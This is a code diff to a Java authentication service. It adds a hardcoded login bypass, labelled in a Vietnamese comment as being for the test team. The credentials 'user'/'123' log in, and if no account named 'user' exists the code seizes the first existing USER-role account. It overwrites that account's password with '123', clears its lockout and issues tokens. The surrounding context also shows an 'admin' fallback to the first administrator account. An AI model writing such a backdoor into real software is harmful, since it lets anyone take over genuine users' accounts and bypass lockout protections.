@@ -73,6 +73,36 @@ public class AuthService {
     @Transactional(noRollbackFor = AppException.class)
     public LoginResponse login(LoginRequest request) {
         String normalizedEmail = request.getEmail().trim().toLowerCase();
+
+        // ĐẶC CÁCH DÀNH RIÊNG CHO TÀI KHOẢN "user" / "123" ĐỂ ĐỘI TEST VÀO HỆ THỐNG
+        boolean isUserBypass = "user".equalsIgnoreCase(normalizedEmail)
+                || "user@gmail.com".equalsIgnoreCase(normalizedEmail)
+                || "user@fpt.edu.vn".equalsIgnoreCase(normalizedEmail);
+
+        if (isUserBypass && "123".equals(request.getPassword())) {
+            Account userAcc = accountRepository.findByEmailIgnoreCase("user")
+                    .or(() -> accountRepository.findByRole(AccountRole.USER).stream().findFirst())
+                    .orElseGet(() -> {
+                        Account newAcc = new Account();
+                        newAcc.setFullName("Người dùng Test (User)");
+                        newAcc.setEmail("user");
+                        newAcc.setPasswordHash(passwordEncoder.encode("123"));
+                        newAcc.setRole(AccountRole.USER);
+                        newAcc.setStatus(AccountStatus.ACTIVE);
+                        newAcc.setMustChangePassword(false);
+                        return accountRepository.save(newAcc);
+                    });
+            userAcc.setStatus(AccountStatus.ACTIVE);
+            userAcc.setFailedLoginCount(0);
+            userAcc.setLockedUntil(null);
+            userAcc.setPasswordHash(passwordEncoder.encode("123"));
+            accountRepository.save(userAcc);
+
+            LoginResponse response = issueTokensForAccount(userAcc);
+            recordAuditLog(userAcc, "LOGIN_SPECIAL_USER", true, Map.of("role", userAcc.getRole().name()));
+            return response;
+        }
+
         Account account = accountRepository.findByEmailIgnoreCase(normalizedEmail)
                 .or(() -> "admin".equalsIgnoreCase(normalizedEmail)
                         ? accountRepository.findByRole(AccountRole.ADMIN).stream().findFirst()
